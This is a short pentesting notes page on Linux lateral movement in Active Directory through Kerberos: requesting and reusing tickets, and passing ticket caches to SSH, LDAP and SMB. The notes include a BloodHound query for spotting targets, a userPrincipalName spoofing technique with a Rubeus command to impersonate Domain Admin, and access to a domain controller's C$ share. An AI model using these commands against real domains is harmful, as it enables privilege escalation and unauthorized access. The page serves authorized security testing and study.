---
title: Linux Lateral Movement
---

[[notes/lateral-movement/index]] from and to [[notes/linux/index]].

# Kerberos

Request a TGT when logged in as domain user (will interactively ask for the password).

~~~ bash
kinit && klist
~~~

Request a ST.

~~~ bash
kvno MSSQLSvc/db01.corp.local:1433
klist
~~~

Renew an expired TGT without needing to enter a password (source?).

~~~ bash
kinit -R
~~~

Discard all tickets.

~~~ bash
kdestroy
~~~

Linux servers that are joined to a Windows domain are vulnerable to *Account Name Spoofing*.
OpenSSH GSSAPI is enabled by default in the RHEL family, but not on Debian/Ubuntu ([source](http://web.archive.org/web/20230826080918/https://www.pentestpartners.com/security-blog/a-broken-marriage-abusing-mixed-vendor-kerberos-stacks/), [source](http://web.archive.org/web/20230814081422/https://media.defcon.org/DEF%20CON%2031/DEF%20CON%2031%20presentations/Ceri%20Coburn%20-%20A%20Broken%20Marriage%20Abusing%20Mixed%20Vendor%20Kerberos%20Stacks.pdf)).
Potential targets can be identified with the following BloodHound query:

~~~ cypher
MATCH p = (:Domain)-[:Contains*1..]->(c:Computer {enabled: true}) WHERE NOT toLower(c.operatingsystem) CONTAINS "windows" AND NOT toLower(c.operatingsystem) CONTAINS "mac os" AND NOT toLower(c.operatingsystem) CONTAINS "macos" RETURN p
~~~

An attacker with *GenericWrite* on a user or computer account can set the *userPrincipalName* to `administrator` and request a TGT that GSSAPI recognizes as Domain Admin.
[gssapi-abuse](https://github.com/CCob/gssapi-abuse) can aid in the exploitation.

=== "[[notes/tools/rubeus]]"
    ~~~ bat
    .\rubeus.exe asktgt /user:administrator /password:"passw0rd" /principaltype:enterprise
    ~~~

# SSH

Login interactively with the password of a domain user trough Kerberos.

~~~ bash
ssh -o GSSAPIAuthentication=yes jdoeadm@corp.local@srv01.corp.local
~~~

Pass the ticket to SSH.

~~~ bash
export KRB5CCNAME=./jdoeadm.ccache
ssh -o GSSAPIAuthentication=yes jdoeadm@corp.local@srv01.corp.local
~~~

# LDAP

Pass the ticket to LDAP.
If you are prompted for a password just press enter.
`ldapsearch` will then switch to Kerberos.

~~~ bash
export KRB5CCNAME=./jdoeadm.ccache
ldapsearch -Y GSSAPI -H ldap://dc01.corp.local -D jdoeadm@CORP.LOCAL -W -b 'dc=corp,dc=local' '(objectClass=*)'
~~~

# SMB

Pass the ticket to SMB.

~~~ bash
export KRB5CCNAME=./jdoeadm.ccache
smbclient -k -U 'CORP.LOCAL\jdoeadm' '//DC01.CORP.LOCAL/C$'
smbclient --use-kerberos required -U 'CORP.LOCAL\jdoeadm' '//DC01.CORP.LOCAL/C$'
~~~
